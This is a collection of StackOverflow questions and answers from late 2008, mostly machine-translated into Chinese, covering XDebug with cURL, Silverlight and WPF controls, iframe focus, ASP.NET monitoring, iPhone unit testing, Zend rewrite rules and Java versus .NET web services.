# StackOverflow 问答 000369000-000369999

# php - How do I debug an Atompub POST sent via cURL to Wordpress on XP + Apache 2.2 + XDebug

> ID：369007
> 
> 赞同：2
> 
> 时间：2008-12-15T16:53:11.173
> 
> 标签：php, netbeans, curl, xdebug

I've been using NetBeans as the XDebug interactive debugging client. But seems like it only supports attaching debuggers to scripts that are invoked via Firefox. I want to step through the request parse script when it's invoked via cURL.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T17:53:28.413

我想出了答案。首先，我通过右键单击 netbeans 中的 wordpress 项目并选择“调试”来附加一个调试器。这将在 url 中使用“XDEBUG_SESSION_START=netbeans-xdebug”参数在 Firefox 中打开博客（例如“ [http://localhost/wordpress/?XDEBUG_SESSION_START=netbeans-xdebug](http://localhost/wordpress/?XDEBUG_SESSION_START=netbeans-xdebug) ”）。

然后我从命令行调用 cURL，确保使用名称/值 XDEBUG_SESSION/netbeans-xdebug 设置一个 cookie：

```
>curl "http://localhost/wordpress/wp-app.php/posts" -X POST -H "Content-type: application/atom+xml" -v -L -k -u admin:password --data @post_atom_entry_bad.xml -o post_bad_response.txt -b XDEBUG_SESSION=netbeans-xdebug
* About to connect() to localhost port 80 (#0)
*   Trying 127.0.0.1... connected
* Connected to localhost (127.0.0.1) port 80 (#0)
* Server auth using Basic with user 'admin'
> POST /wordpress/wp-app.php/posts HTTP/1.1
> Authorization: Basic YWRtaW46d2Fuc3Vp
> User-Agent: curl/7.19.1 (i586-pc-mingw32msvc) libcurl/7.19.1 OpenSSL/0.9.8i zlib/1.2.3
> Host: localhost
> Accept: */*
> Cookie: XDEBUG_SESSION=netbeans-xdebug
> Content-type: application/atom+xml
> Content-Length: 302
>
} [data not shown]
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   302    0     0    0   302      0     74 --:--:--  0:00:04 --:--:--     0 
```

此时 cURL 在我在 wp-app.php 的第 283 行设置的断点处停止，AtomParser->handle_request()，我可以单步执行代码。

单击 F5（继续）后，服务器会将响应发送回 cURL：

```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   302    0     0    0   302      0      2 --:--:--  0:02:17 --:--:--     0< HTTP/1.1 400 Bad Request
< Date: Mon, 15 Dec 2008 17:47:06 GMT
< Server: Apache/2.2.9 (Win32) DAV/2 mod_ssl/2.2.9 OpenSSL/0.9.8i mod_autoindex_color PHP/5.2.6
< X-Powered-By: PHP/5.2.6
< Content-Length: 0
< Connection: close
< Content-Type: text/plain
<
100   302    0     0    0   302      0      2 --:--:--  0:02:18 --:--:--     0* Closing connection #0

> 
```

完毕。从记事本++等其他交互式调试客户端获取示例会很棒。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T18:00:28.493

相关 XDebug 文档：[http ://www.xdebug.org/docs/remote#browser_session](http://www.xdebug.org/docs/remote#browser_session)

# oracle - Reading an Oracle Lite ODB file without Oracle Lite

> ID：369010
> 
> 赞同：0
> 
> 时间：2008-12-15T16:55:09.623
> 
> 标签：oracle

Is there a way to extract the data from an Oracle Lite ODB file without installing Oracle Lite? Is there a reader out there which will let me browse and copy the data?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T01:10:27.253

您应该能够使用 OLLOAD 实用程序导出数据，该实用程序是 Oracle Lite 的一部分，但不需要安装。

[OLLOAD 文档](http://download.oracle.com/docs/cd/E12095_01/doc.10302/e12548/cdbtools.htm#BABIIJGF)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-02-01T16:05:24.310

如果您知道您需要的表，那么您确实需要 Oracle Lite。但是，您的类路径中必须有 webtogo.jar。然后，您可以简单地编写一个小型 java 程序，通过 JDBC 连接到 ODB 并提取您需要的数据。

# silverlight - 失去焦点后保持 Silverlight Combobox DropDown 打开

> ID：369011
> 
> 赞同：3
> 
> 时间：2008-12-15T16:55:18.127
> 
> 标签：silverlight

是否可以避免在 LostFocus 之后 Silverlight ComboBox 自动折叠？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2010-02-01T12:42:56.487

好吧，看看反汇编的代码，它看起来像

`protected override void OnLostFocus(RoutedEventArgs e) { base.OnLostFocus(e); this.FocusChanged(this.HasFocus()); }`

是覆盖的良好候选者。

如果不实现您自己的控件子类，就无法解决您的问题。

当我选择一个项目时，我已经做了同样的事情来拥有一个`ComboBox`不会`Popup`关闭的 a （我想要一个多选行为）。

如果有人感兴趣，这是我的课程（对我来说效果很好）：

```
public class ComboBoxWithMultiSelect : ComboBox
{
    protected override void OnKeyDown(KeyEventArgs e)
    {
        if (base.IsDropDownOpen &&
                (e.Key == Key.Enter ||
                e.Key == Key.Space))
        {
            e.Handled = true;
        }
        else
        {
            base.OnKeyDown(e);
        }
    }

    protected override DependencyObject GetContainerForItemOverride()
    {
        return new ComboBoxItemWithMultiSelect();
    }
}

public class ComboBoxItemWithMultiSelect : ComboBoxItem
{
    protected override void OnMouseLeftButtonUp(MouseButtonEventArgs e)
    {
        if (e == null)
        {
            throw new ArgumentNullException("e");
        }
        if (!e.Handled)
        {
            e.Handled = true;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T11:21:14.307

我不认为有一个简单的方法来解决这个问题。下面的代码是从 ComboBox 类的反汇编代码中复制而来的。如您所见，当 hasFocus 为假时，它总是关闭。我认为没有办法解决这个问题。编写自己的 ComboBox 是一种解决方案。

```
private void FocusChanged(bool hasFocus)
{
    this.UpdateSelectionBoxHighlighted();
    base.SetValueInternal(IsSelectionActiveProperty, hasFocus, true);
    if (!hasFocus)
    {
        this.IsDropDownOpen = false;
    }
} 
```

# asp.net - AJAX form editing and design

> ID：369016
> 
> 赞同：0
> 
> 时间：2008-12-15T16:57:45.610
> 
> 标签：asp.net, ajax, user-interface, survey

I want to build into mt ASP.NET application the ability for users to fill up forms, but the forms are not something I can hard-code into my (Enterprise) software.

So I need one screen that lets end users create the forms. Doing it the 2.0 way, I just love what PollDaddy did in their survey editor (great job guys!). How do I replicate that? (don't worry pollDaddy, my app has nothing to do with survey and I am not at all in your domain (-: )

Since you need to login to the site to play with it, I made a 20 sec video of how it looks like. Please see below and tell me how to best replicate this (as simple as using JQuery tip? use an entire open source project? Buy something?)

Requirements are:

*   support multiple types of elements (like multiple choice, free text, comboBox)
*   drag and drop
*   editing of order

*click image for video or [here](http://revver.com/video/1376799/affiliate/24133/pd-editor-example/)*

[http://frame.revver.com/frame/120x90/1376799.jpg](http://revver.com/video/1376799/affiliate/24133/pd-editor-example/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-20T22:58:34.640

[AJAX 控制工具包](http://www.asp.net/ajax/ajaxcontroltoolkit/samples/)是免费的，适用于视频中显示的其中一些项目。然而，JQuery 有大量的插件，很容易扩展，甚至更容易使用。我建议从那里开始并在需要的地方扩展它。

祝你好运

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T04:24:25.550

您可以使用 AJAX 框架（如 ASP.NET AJAX 甚至 Telerik 控件）自己构建它。您可以使用 jQuery，但 ASP.NET AJAX 是免费的，并且可以很好地嵌入 ASP.NET 页面。你可以买东西，但我还没有遇到过这样的包裹。

# java - 使用 Tomcat 服务目录？

> ID：369023
> 
> 赞同：4
> 
> 时间：2008-12-15T16:59:56.743
> 
> 标签：java, tomcat, file

我在 linux 机器上有一个目录，我想使用 Tomcat (5.5) 使其公开可读。我认为这很容易设置，但找不到合适的文档。有没有一种简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T17:04:25.253

可以通过将该目录定义为 Web 应用程序，但这并不是 Tomcat 真正设计的目的，其他服务器在提供静态内容方面要好得多。

将目录定义为 webapp 的方法是

*   放入`$TOMCAT_HOME/webapps`，
*   配置它`$TOMCAT_HOME/conf/server.xml`或
*   提供一个上下文`.xml`文件并将其放入`$TOMCAT_HOME/conf/Catalina/localhost`（默认情况下，取决于您的配置）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T17:06:08.027

您可以将其链接到 webapps 下的文件夹作为新的“Web 应用程序”。

```
ln -s /path-to-real-folder /path-to-tomcat/webapps/publicfoldername 
```

如果我没记错的话，tomcat 中默认启用目录列表，因此可以访问该目录。如果没有，这可以在 web.xml 中修复

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-12-15T17:13:01.490

尽管 Tomcat 是一个很好的 Web 服务器，但它并不是专门用来列出目录的。

你可能想看看像[Apache](http://www.apache.org/) Web 服务器这样的 Web 服务器，它更适合这种类型的东西。

# c# - listview item cut style in .NET?

> ID：369024
> 
> 赞同：2
> 
> 时间：2008-12-15T17:00:40.347
> 
> 标签：c#, .net, winforms, listview

How do I achieve the equivalent of the LVIS_CUT style for a listview item? It looks like it's not exposed by the framework? Should I P/Invoke?

Edit: LVIS_CUT is a Win32 style that affects the look of the item: It grays the item image. You can see it in action in Windows Explorer: Select a file and type Ctrl+X.

TIA.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-10T18:44:37.827

好吧，“实现相当于 LVIS_CUT 样式”的一种方法如下：

使用沿线的功能

```
private void MakeCutList(ImageList sourceList, Color background)
{
   Brush overlay = new SolidBrush(Color.FromArgb(128, BackColor));
   Rectangle rect = new Rectangle(new Point(0, 0), sourceList.ImageSize);

   foreach (Image img in sourceList.Images)
   {
      Bitmap cutBmp = new Bitmap(img.Width, img.Height);

      using (Graphics g = Graphics.FromImage(cutBmp))
      {
         g.DrawImage(img, 0, 0);
         g.FillRectangle(overlay, rect);
      }

      sourceList.Images.Add(cutBmp);    
   }
} 
```

获取 ListView 使用的图像列表（即 listView1.ImageList）并添加所有图标的“剪切”版本。您可以在表单中的 InitializeComponent 之后立即调用它，例如

```
public Form1()
{
    InitializeComponent();
    MakeCutList(listView1.LargeImageList, listView1.BackColor);
} 
```

然后你可以使用这样的代码

```
private void SetCutState(ListViewItem lvi, Boolean isItemCut)
{
    int originalListSize = lvi.ImageList.Images.Count / 2;
    int baseIndex = lvi.ImageIndex % originalListSize;
    int cutImagesOffset = originalListSize;

    if (isItemCut)
    {
        lvi.ImageIndex = cutImagesOffset + baseIndex;
        lvi.ForeColor = SystemColors.GrayText;
    }
    else
    {
        lvi.ImageIndex = baseIndex;
        lvi.ForeColor = SystemColors.WindowText;
    }
} 
```

将项目的状态更改为被切割或不被切割。

一旦你得到这个工作，你可以尝试将类似的代码放入 ListView 控件的子类版本中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T17:09:38.627

Are you referring to when it's grayed out? Like when you do a "cut" on it? If so, I would just set the forecolor to Inactive or something along those lines. Not sure that you need to pinvoke for something like that.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-02-01T15:46:17.433

我将它用于我的文件资源管理器应用程序..

```
 private void MakeCutItem()
    {
        foreach (ListViewItem item in listView1.SelectedItems)
        {
            Image img = item.ImageList.Images[item.ImageIndex];
            Brush overlay = new SolidBrush(Color.FromArgb(128, BackColor));
            Rectangle rect = new Rectangle(new Point(0, 0), item.ImageList.ImageSize);
            using (Graphics g = Graphics.FromImage(img))
            {
                g.FillRectangle(overlay, rect);
            }
            item.ImageIndex = item.ImageList.Images.Add(img,Color.Empty);
        }
    } 
```

# javascript - 将焦点设置为 iframe 内容

> ID：369026
> 
> 赞同：55
> 
> 时间：2008-12-15T17:00:48.317
> 
> 标签：javascript, dom, iframe, setfocus

我有一个带有`document.onkeydown`事件处理程序的页面，我将它加载到另一个页面的 iframe 中。我必须在 iframe 内单击才能让内容页面开始“收听”。

有什么方法可以在外部页面中使用 JavaScript 将焦点设置到内部页面，这样我就不必在 iframe 内单击？

编辑：回复评论：

上下文是主窗口是一个类似灯箱的系统，除了不是图片，它显示 iframe，每个 iframe 都是一个带有 keydown/mousemove 处理程序的交互式页面。直到我在显示灯箱后单击 iframe 后，这些处理程序才会触发。

我实际上并不是在寻找传统意义上的“setFocus”，而是“在 iframe contentDocument 上启用事件处理程序”

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2010-01-15T09:13:22.057

我对 jQuery Thickbox（一个灯箱样式的对话框小部件）也有类似的问题。我解决问题的方法如下：

```
function setFocusThickboxIframe() {
    var iframe = $("#TB_iframeContent")[0];
    iframe.contentWindow.focus();
}

$(document).ready(function(){
   $("#id_cmd_open").click(function(){
      /*
         run thickbox code here to open lightbox,
         like tb_show("google this!", "http://www.google.com");
       */
      setTimeout(setFocusThickboxIframe, 100);
      return false;
   });
}); 
```

如果没有 setTimeout()，代码似乎无法工作。根据我的测试，它适用于 Firefox3.5、Safari4、Chrome4、IE7 和 IE6。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2010-07-16T11:07:05.650

使用 contentWindow.focus() 方法，超时可能是等待 iframe 完全加载所必需的。

对我来说，在 iframe 标签中也可以使用属性`onload="this.contentWindow.focus()"`，使用 firefox

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-12-15T17:04:34.503

```
document.getElementsByName("iframe_name")[0].contentWindow.document.body.focus(); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-12-15T17:42:35.800

尝试侦听父文档中的事件并将事件传递给 iframe 文档中的处理程序。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-11-19T20:53:13.140

我有一个类似的问题，我试图专注于从另一个页面加载的 iframe 中的 txt 区域。在大多数情况下它工作。存在一个问题，即当 iFrame 加载但在它可见之前它会在 FF 中触发。所以焦点似乎从未正确设置。

我用一个类似的解决方案来解决这个问题

```
 var iframeID = document.getElementById("modalIFrame"); 
//focus the IFRAME element 
$(iframeID).focus(); 
//use JQuery to find the control in the IFRAME and set focus 
$(iframeID).contents().find("#emailTxt").focus(); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-26T12:52:53.440

我发现 FF 会触发 iframe.contentWindow 的焦点事件，但不会触发 iframe.contentWindow.document 的焦点事件。例如，Chrome 可以处理这两种情况。所以，我只需要将我的事件处理程序绑定到 iframe.contentWindow 以使事情正常进行。也许这可以帮助某人...

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-04-13T18:49:42.523

这是使用 jQuery 创建 iframe 的代码，将其附加到文档中，轮询它直到它被加载，然后聚焦它。这比设置任意超时要好，这取决于 iframe 加载所需的时间，可能会或可能不会起作用。

```
var jqueryIframe = $('<iframe>', {
    src: "http://example.com"
}),
focusWhenReady = function(){
    var iframe = jqueryIframe[0],
    doc = iframe.contentDocument || iframe.contentWindow.document;
    if (doc.readyState == "complete") {
        iframe.contentWindow.focus();
    } else {
        setTimeout(focusWhenReady, 100)
    }
}
$(document).append(jqueryIframe);
setTimeout(focusWhenReady, 10); 
```

检测 iframe 何时加载的代码改编自[Biranchi](https://stackoverflow.com/users/97651/biranchi)对[如何检查 iframe 是否已加载或是否有内容的回答？](https://stackoverflow.com/questions/9249680/how-to-check-if-iframe-is-loaded-or-it-has-a-content)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-18T00:58:48.587

这对我有用，虽然它闻起来有点不对劲：

```
var iframe = ...
var doc = iframe.contentDocument;

var i = doc.createElement('input');
i.style.display = 'none'; 
doc.body.appendChild(i);
i.focus();
doc.body.removeChild(i); 
```

嗯。它还会滚动到内容的底部。猜猜我应该在顶部插入虚拟文本框。

# asp.net - Monitoring load on ASP.NET Application

> ID：369040
> 
> 赞同：6
> 
> 时间：2008-12-15T17:06:40.117
> 
> 标签：asp.net, performance

I am looking for ways to keep track of simultaneous users within an application. I cannot use IIS logs due to a load balancer that abstracts the users IP address. I am looking for a .NET code based solution or a configuration item, possibly with health monitoring to be able to track the "true" simultaneous user count.

I know that I can monitor the number of sessions, but that isn't really an ideal method to show, as it can be bloated based on the number of sessions with users abandoning their session.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T17:27:59.933

这里有一个类似的问题：[用于实时监控 ASP.NET Web 应用程序的工具和方法？](https://stackoverflow.com/questions/259105/tools-and-methods-for-live-monitoring-aspnet-web-applications)

我找到了一个用于调试和监视 .NET 应用程序的高级日志记录工具：[SmartInspect](http://www.gurock.com/products/smartinspect/)。但我不知道它是否符合您的要求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-17T00:04:40.457

What do you mean of "simultaneous users"? Perhaps you should monitor simultaneous TCP connections to your IIS application? Windows Performance Monitor tools should help you there.

Otherwise there is no sure way of telling how many users are using your application right now. If you can monitor number of sessions, then I'd suggest going with that. Just take into account the last modification time of the sessions, so you could get something like "active sessions in the last minute". That should give you a close measurment.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-18T08:57:46.013

最后，我们决定使用 ASP.NET 性能计数器以及来自 IIS 日志的通用信息。

我使用 Microsoft Log Parser 工具从两个来源解析了信息！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-03T02:17:09.700

我们正在使用昂贵的解决方案，即 AVICode，但它很棒。你可以用它监控很多东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-16T23:59:08.863

You just want to know the number of active users at a particular time? An easy option that omits inactive users as well as most bots would be to register the user as active through a JavaScript AJAX call on page load along with their SessionID. You can then purge old records from the log as you see fit. *Be careful of how you build your table's performance for read/write optimizations. ... just an idea off the top of my head.

# iphone - iPhone 上的 UnitTesting 无法构建

> ID：369041
> 
> 赞同：2
> 
> 时间：2008-12-15T17:07:24.497
> 
> 标签：iphone, objective-c, unit-testing, xcode

我正在尝试在 iphone 上执行一些单元测试，但由于某种原因，我无法让它构建可执行文件

我已经从 Standford 的讲座幻灯片中下载了 TestMyApp，它可以完美地编译和运行。我创建了一个测试项目，甚至使用了斯坦福示例中的测试代码，但由于某种原因，每个设置看起来都相同，我得到以下预编译器错误：

> /System/Library/Frameworks/Cocoa.framework/Headers/Cocoa.h:13:26：错误：AppKit/AppKit.h：没有这样的文件或目录/System/Library/Frameworks/Cocoa.framework/Headers/Cocoa.h :14:30：错误：CoreData/CoreData.h：没有这样的文件或目录

注意>唯一需要注意的一点是，我在 PPC 上的“调整”xcode 安装上运行它，而不是英特尔 mac

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-23T17:28:09.173

如果您右键单击您的单元测试目标并选择“获取信息”菜单，您将看到您的目标选项。在窗格的底部，您将看到一个名为“用户定义”的部分：删除包含 cocoa.h 路径的条目。我不记得这个条目的名称，因为我删除了它，但这解决了我之前遇到的同样问题。

我还将 Base SDK 更改为 Device - iPhone OS 2.2 和其他链接器标志为 -framework Foundation -framework SentestingKit

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T17:21:34.470

AppKit 不适用于 iPhone 开发。看起来您下载了一个桌面 mac 应用程序项目。iPhone dev 使用 UIKit 代替 AppKit。CoreData 也不适用于 iPhone 开发人员。

尝试设置一个桌面可可应用程序，这些框架和对象应该可用。

对于 iPhone 应用程序的单元测试，Mac 版 Google 工具箱非常有用。

[GTM iPhone 文档](http://code.google.com/p/google-toolbox-for-mac/wiki/iPhoneUnitTesting)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-14T23:16:05.430

您可以在 Sen:te 网站上找到说明和示例项目：[http ://www.sente.ch/s/?p=535&lang=en](http://www.sente.ch/s/?p=535&lang=en)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-19T18:09:14.913

我不得不在“用户定义部分”中删除 GCC_PREFIX_HEADER 的值。它正在使用 $(SYSTEM_LIBRARY_DIR)/Frameworks/Cocoa.framework/Headers/Cocoa.h

一旦我删除它，我就解决了这个问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T19:11:31.893

您是否安装了 iPhone SDK 2.2？如果不使用 iPhone 的 GTM，OCunit 不能与 iPhone SDK < 2.2 一起使用。

我也一直在使用斯坦福示例代码。当我尝试建立自己的项目时，我无法让我的测试运行。因此，我采用了斯坦福示例项目并重命名了所有内容。现在 OCunit 测试工作正常。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-03T08:49:52.893

不要使用 Sen:te 东西来测试任何使用 UIKit 框架的类。它将失败，代码为 139。使用 Google 的 GTM。

# c# - 中继器控制聚合数据？

> ID：369042
> 
> 赞同：0
> 
> 时间：2008-12-15T17:07:24.763
> 
> 标签：c#, asp.net, sql, sql-server, sql-server-2005

我有一张桌子，上面有医生办公室和我要填充到中继器控件的那些办公室的医生。返回的数据未汇总。因此，如果 1 个办公室有 2 位医生，则有 2 行，同一个办公室，不同的医生。

有没有办法聚合数据，以便中继器显示 1 个办公室以及该办公室的所有医生，这样我就可以避免重复？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T17:31:15.150

在您的 aspx 标记中：

```
<table><tr><th>Office</th><th>Doctors</th></tr>
<asp:repeater id="Repeater" runat="server" OnItemDataBound="NextItem" ... >
    <ItemTemplate><asp:Literal id="RepeaterRow" runat="server" />
    </ItemTemplate>
</asp:repeater>
<asp:Literal id="LastRow" runat="server" />
</table> 
```

在您后面的代码中：

```
public class Office
{
    public string OfficeName {get;set;};
    List<string> _doctors = new List<string>();
    public List<string> Doctors {get{ return _doctors; } };

    void Clear()
    {
        OfficeName = "";
        _doctors.Clear();
    }

    public override string ToString()
    {
        StringBuilder result = new StringBuilder("<tr>");

        result.AppendFormat("<td>{0}</td>", OfficeName);

        string delimiter = "";
        result.Append("<td>");
        foreach(string doctor in Doctors)
        {
           result.Append(doctor).Append(delimiter);
           delimiter = "<br/>";
        }

        result.Append("</td></tr>");

        return result.ToString();
    }
} 
```

.

```
private string CurOffice = "";
private Office CurRecord = new Office();

void NextItem(object sender, RepeaterItemEventArgs e)
{
    if (e.Item.ItemType != ListItemType.Item && e.Item.ItemType != ListItemType.AlternatingItem) return;

    Literal repeaterRow = e.Item.FindControl("RepeaterRow") as Literal;
    if (repeaterRow == null) return;

    DataRow row = ((DataRowView)e.Item.DataItem).Row;

    if ( CurOffice != (string)row["Office"] )
    {
        repeaterRow.Text = CurRecord.ToString();
        repeaterRow.Visible = true;

        CurRecord.Clear();
        CurOffice = row["Office"];
        CurRecord.Office = CurOffice;
    }
    else
        e.Item.Visible = false;

    CurRecord.Doctors.Add((string)row["doctor"]);
}

void Page_PreRender(object sender, EventArgs e)
{
    LastRow.Text = CurRecord.ToString();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T17:10:56.910

我认为你最好在数据库中进行聚合。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T17:19:36.673

我正在考虑这一点，但认为可能有一种更好的方法来做到这一点。

如果在数据库中聚合，传递一个分隔列并在数据绑定期间对其进行解析？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T14:16:04.990

使用 SQL 合并函数

来自 SQLTeam.com：

```
DECLARE @EmployeeList varchar(100)

SELECT @EmployeeList = COALESCE(@EmployeeList + ', ', '') + 
       CAST(Emp_UniqueID AS varchar(5))
FROM SalesCallsEmployees
WHERE SalCal_UniqueID = 1 
```

这将创建一个以逗号分隔的员工列表。你也可以为医生这样做

# wpf - 自动将 ListBoxItem 的部分聚焦在选择上

> ID：369045
> 
> 赞同：1
> 
> 时间：2008-12-15T17:08:53.013
> 
> 标签：wpf, xaml

我有一个 ListBox，它是从一组 ViewModel 中填充的，它使用就地编辑，我通过有几个样式来做到这一点，我可以将这些样式应用于 DataTemplate 的某些部分，使它们根据需要可见/折叠。这些看起来像：

```
<Style
    x:Key="UnselectedVisibleStyle"
    TargetType="{x:Type FrameworkElement}">
    <Setter
        Property="Visibility"
        Value="{Binding Path=IsSelected, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type ListBoxItem}}, Converter={StaticResource boolToVis}, ConverterParameter=False}" />
</Style>
<Style
    x:Key="SelectedVisibleStyle"
    TargetType="{x:Type FrameworkElement}">
    <Setter
        Property="Visibility"
        Value="{Binding Path=IsSelected, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type ListBoxItem}}, Converter={StaticResource boolToVis}, ConverterParameter=True}" />
</Style> 
```

我的 ListBox 有它的 ItemTemplate 由类似的东西给出：

```
 <ListBox.ItemTemplate>
        <DataTemplate>
             <Grid>                      
                <TextBlock
                    Text="{Binding Name}"
                    Style="{StaticResource UnselectedVisibleStyle}" />
                <TextBox
                    x:Name="textBox"
                    Text="{Binding Name}"
                    Style="{StaticResource SelectedVisibleStyle}" />
             </Grid>
        </DataTemplate>
    </ListBox.ItemTemplate> 
```

这很好用，但理想情况下，我希望在用户单击项目时自动选择 TextBox，理想情况下，我可以在整个项目中使用一种很好的通用方式，并且在我的代码隐藏中没有太多混乱。

谢谢，DM。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-16T00:06:35.993

您选择的样式的以下更改似乎对我有用：

```
<Style x:Key="SelectedVisibleStyle" TargetType="{x:Type FrameworkElement}">
    <Setter Property="Visibility" Value="{Binding Path=IsSelected, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type ListBoxItem}}, Converter={StaticResource boolToVis}, ConverterParameter=True}"/>
    <Style.Triggers>
        <Trigger Property="Visibility" Value="Visible">
            <Setter Property="FocusManager.FocusedElement" Value="{Binding RelativeSource={RelativeSource Self}}"/>
        </Trigger>
    </Style.Triggers>
</Style> 
```

# eclipse - .htaccess 用于 Zend 调试器、Eclipse 和 Zend 框架

> ID：369046
> 
> 赞同：0
> 
> 时间：2008-12-15T17:09:02.403
> 
> 标签：eclipse, debugging, zend-framework, mod-rewrite, zend-debugger

我想在 Eclipse 的 Zend Framework 中调试我的项目。Zend Debugger 已经开始运行了，现在我在 Eclipse 中的调试工具有问题。它提供了一个额外的 GET 参数，而 Zend 中的项目不喜欢它。

我试图用谷歌搜索它并找到[了这个](http://framework.zend.com/wiki/display/ZFDEV/Configuring+Your+URL+Rewriter)

我修改了*.htaccess*文件，但没有让它工作。

```
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^(.*)?(start_debug=1.*)$ index.php?$2 [L]
RewriteRule ^.*$ - [NC,L]
RewriteRule ^.*$ index.php [NC,L] 
```

不知道它是否完全正确，因为[页面](http://framework.zend.com/wiki/display/ZFDEV/Configuring+Your+URL+Rewriter)上的重写规则有一些我的 Apache 无法使用的未知标志。

Eclipse制作的链接是

> [http://localhost/?debug_start_url=http://localhost/&debug_session_id=1007&start_debug=1&debug_host=127.0.0.1&debug_no_cache=1229359621130&debug_port=10000&send_sess_end=1&original_url=http://localhost/&debug_stop=1](http://localhost/?debug_start_url=http://localhost/&debug_session_id=1007&start_debug=1&debug_host=127.0.0.1&debug_no_cache=1229359621130&debug_port=10000&send_sess_end=1&original_url=http://localhost/&debug_stop=1)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T15:53:24.303

我成功使用了调试器，我的 htaccess 看起来像这样

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php [QSA,L]
    RewriteCond %{REQUEST_FILENAME} (logs|library|application|config)
    RewriteRule ^(.*)$ index.php
</IfModule> 
```

这基本上是说，如果 url 不指向存在的目录或文件，则通过我的 index.php（也阻止日志、库、应用程序和配置文件夹，因为有时它们位于我的某些文件的根目录中）由于服务器限制的项目）。到目前为止，我在任何项目上都没有失败过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-01-10T17:11:48.030

使用实际的 Zend Framework 1.9.6 和 Zend Debugger 无需任何特殊更改即可工作

# java - Web 服务 - Java 还是 .NET？

> ID：369059
> 
> 赞同：2
> 
> 时间：2008-12-15T17:12:56.123
> 
> 标签：java, .net, web-services

我需要在即将到来的项目中实现 web 服务，并且想知道决定是使用 java 还是 .NET 实现的要点是什么

我是 C++ 程序员...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-15T17:15:26.573

如果您是 Java 商店，请使用 Java。如果您是 .NET 商店，请使用 .NET。

在 Web 服务方面，这两种语言中的一种确实优于另一种，这并没有什么区别。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T17:24:12.403

可能的考虑 - .NET pre 3.5 仅提供对基于 SOAP 的服务的支持，但我相信 3.5 WCF 现在提供 REST 和 SOAP。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T17:23:19.740

从程序员的角度（实现）来看，没有真正的区别。

对我来说，选择 Java 的一个原因是所有工具和基础设施都是免费/开源的。操作系统、部署 Web 服务器、数据库、IDE 和开发人员工具。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-02-23T02:53:13.707

我在这两个方面都有丰富的经验，而且两者肯定都能胜任。

但是，出于以下原因，对于 Web 服务之类的事情，我倾向于使用 Java 而不是 .Net：

*   它是**跨平台**的，可以在托管方面为您提供更好的选择（例如在 Amazon EC2 上运行大型 Linux 集群）
*   图书馆**生态系统**更大更成熟，尤其是在服务器端。
*   我更喜欢更灵活的**开源理念**，而不是“唯一的方法是微软”。从长远来看，供应商锁定对于您的企业架构来说总是一个坏主意。
*   您可以选择在 JVM 上使用很棒的语言，例如**Clojure**或**Scala**

但最终，我会选择你的团队最擅长的那个。这将决定你最有效率的东西，如果你的主要目标是快速交付价值，这通常是最重要的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-15T17:17:38.283

这是个人决定，通常由现有技术或编写服务的开发人员的技能决定。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-15T17:19:58.450

我从来没有真正用 Java 开发过 Web 服务，但我在 .NET 中有过，如果你使用 Visual Studio，它们绝对是轻而易举的事（我希望如果没有VS）。

